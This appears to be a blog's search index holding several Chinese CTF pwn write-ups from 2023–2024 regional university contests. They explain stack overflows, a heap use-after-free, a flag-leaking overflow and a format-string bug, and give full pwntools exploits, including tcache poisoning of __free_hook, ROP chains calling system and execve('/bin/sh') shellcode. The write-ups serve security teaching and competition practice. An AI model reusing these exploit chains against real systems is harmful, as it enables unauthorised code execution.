class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31-0kylin9.2k0.2.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;adventurer? &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;bytes): &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;bytes):&quot;</span>)<br>p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;index (0-19): &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>p.recvuntil(<span class="hljs-string">&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;: &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>p.recvuntil(<span class="hljs-string">b&#x27;adventurer? &#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br><span class="hljs-comment"># attach(p)</span><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#chunk 0</span><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#chunk 1</span><br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ebbe0</span><br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-string">&#x27;system:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(system)))<br>one_gadget = libc_base + <span class="hljs-number">0xe6c81</span><br><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x100</span>, p64(system))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024年京津冀大学生信息安全网络攻防大赛-初赛Pwn</title>
    <link href="/post/41677.html"/>
    <url>/post/41677.html</url>
    
    <content type="html"><![CDATA[<p>2024年这场打了，Pwn一共三道题，堆题还是没给libc，最后是0解。</p><h1 id="likeputs"><a href="#likeputs" class="headerlink" title="likeputs"></a>likeputs</h1><p>vuln函数有栈溢出，而且程序有system，但是没有&#x2F;bin&#x2F;sh字符串。我们发现有cat flag字符串，如果system的参数是cat flag即system(‘cat flag’)，那么就会将flag打印出来。因此只需要构造一个简单的rop，使得system的参数为cat flag，就能打印flag。</p><img src="/post/41677/1725704829145-3bc1e164-061a-4655-8fb5-1eb521fbf747.png" class="" title="img"><img src="/post/41677/1725704849717-c5b05968-3906-4b5c-86e8-fe7db307e086.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;119.23.41.54&#x27;</span>, <span class="hljs-number">39091</span>)<br><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400753</span><br>flag_addr = <span class="hljs-number">0x400797</span><br>ret_addr = <span class="hljs-number">0x400506</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(flag_addr) <br>payload += p64(ret_addr) +  p64(system_plt) <br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/post/41677/1725683643285-a3c9f395-a07a-49a1-8e9b-c02bd4ef0d77.png" class="" title="img"><h1 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h1><p>程序中首先是两个输入，一个是 name，一个是 flag，然后会使用一个 for 循环来将输入 name 的存储到 name 数组的前 40 个位置，即 name[0] 到 name[39]，而 name[40] 则是 .&#x2F;flag 文件的内容，循环中使用 if 来比较 name[40] 开始是否等于输入的 flag 的内容。</p><p>他其实是从.&#x2F;flag 文件中读取一个字符到 name[40] 中，然后再和输入的 flag 比对，比对正确再次读取.&#x2F;flag 文件中的一个字符，比对错误之后跳出循环；那么当比对错误时，name[40] 时中是正确的 flag 的一个字符，通过之后的 pirntf 打印 name 的内容，这一个字符也会打印出来，因此可以通过溢出的这一个字符来循环爆破</p><img src="/post/41677/1735046396801-1b2253f3-7158-4dfc-a559-583286a33002.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>flag = <span class="hljs-string">b&#x27;flag&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br><span class="hljs-built_in">print</span>(flag)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span><br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;Please give me your flag:&quot;</span>)<br>p.sendline(flag)<br>p.recvuntil(<span class="hljs-string">b&quot;Sorry &quot;</span>+payload)<br>two = p.recv(<span class="hljs-number">1</span>)<br>flag += two<br>p.close()<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023年天津市大学生信息安全网络攻防大赛-初赛Pwn</title>
    <link href="/post/51907.html"/>
    <url>/post/51907.html</url>
    
    <content type="html"><![CDATA[<p>2023年还没打CTF，这是后面拿到题目才写的wp，还有就是堆题没有给libc，不知道怎么打。</p><h1 id="skill"><a href="#skill" class="headerlink" title="skill"></a>skill</h1><p>ret2libc</p><p>add函数，往result数组写入内容</p><img src="/post/51907/1734435833506-efcccdae-6b3a-4847-8302-126d2e837267-1735102388940-60.png" class="" title="img"><p>show 函数存在栈溢出，但是if中有四个判断，需要等于song、jump、rap和NBA才能执行到gets函数从而进行栈溢出</p><img src="/post/51907/1734435807465-350a564a-d872-430d-9504-abbf7fee8837-1735102388941-61.png" class="" title="img"><p>解法很明显，先在add函数中写入song、jump、rap和NBA，然后在show函数打ret2libc</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4008B6</span><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x400297</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;5. exit&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Input your skill: &quot;</span>)<br>p.sendline(content)<br><br>add(<span class="hljs-string">b&quot;song&quot;</span>)<br>add(<span class="hljs-string">b&quot;jump&quot;</span>)<br>add(<span class="hljs-string">b&quot;rap&quot;</span>)<br>add(<span class="hljs-string">b&quot;NBA&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;5. exit&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;music~&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi) + p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;5. exit&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;music~&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_rdi) + p64(binsh)<br>payload += p64(ret) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="dragon-game"><a href="#dragon-game" class="headerlink" title="dragon_game"></a>dragon_game</h1><p>格式化字符串漏洞+shellcode</p><p>main 函数中，程序使用 malloc 函数分配了8个字节的内存空间，并将返回的指针赋值给 secret，接着将 secret 指向的第一个地址的值置为 666，将 secret 指向的第二个地址的值置为 233；然后是打印了 secret 和 secret[1] 的地址，之后调用了 vuln</p><img src="/post/51907/1734434203519-a535b810-1556-44b7-ba84-5a0b8a2d383a-1735102388941-62.png" class="" title="img"><p>vuln 函数中有三个函数被调用</p><img src="/post/51907/1734434912123-6fbca87a-e9db-4274-89ff-0f21a0d8f500-1735102388941-63.png" class="" title="img"><p>vuln1 函数中，主要逻辑就是判断输入 east 还是 west，选择 east 才可以返回从而执行下一个函数，选择 west 会退出</p><img src="/post/51907/1734434969108-2c0a5f39-bfb8-427b-9382-cfe2121221cc-1735102388941-64.png" class="" title="img"><p>vuln2 函数，这里存在一个格式化字符串漏洞</p><img src="/post/51907/1734435204370-2d0b3e88-0b50-436b-863c-04d814246ac7-1735102388941-65.png" class="" title="img"><p>vuln3 函数，result 的值等于 secret[1] 即 233，然后判断 secret 是否等于 result；if 中将 buf 用 mmap 函数设置成了可读可写可执行，然后用 read 对 buf 进行读入</p><img src="/post/51907/1734435262487-0b599027-957d-4b5b-8c9a-2a4ea4f395a5-1735102388941-66.png" class="" title="img"><p>思路很明显就是在 vuln3 函数中往 buf 注入 shellcode，但是需要 secret 等于 result，我们知道 secret 是 666，而 result 是 233；此时我们可以利用 vuln2 函数的格式化字符串漏洞将 secret 改成 233 ，或者将 secret[1] 改成 666</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;secret:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(secret)))<br>p.recvuntil(<span class="hljs-string">&quot;secret[1] is &quot;</span>)<br>secret1 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;secret1:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(secret1)))<br><br><span class="hljs-comment"># attach(p, &#x27;b *0x400A37&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;east or west?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;11&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;And, you wish is:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%233c&#x27;</span> + <span class="hljs-string">b&#x27;%10$n&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(secret)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 59</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
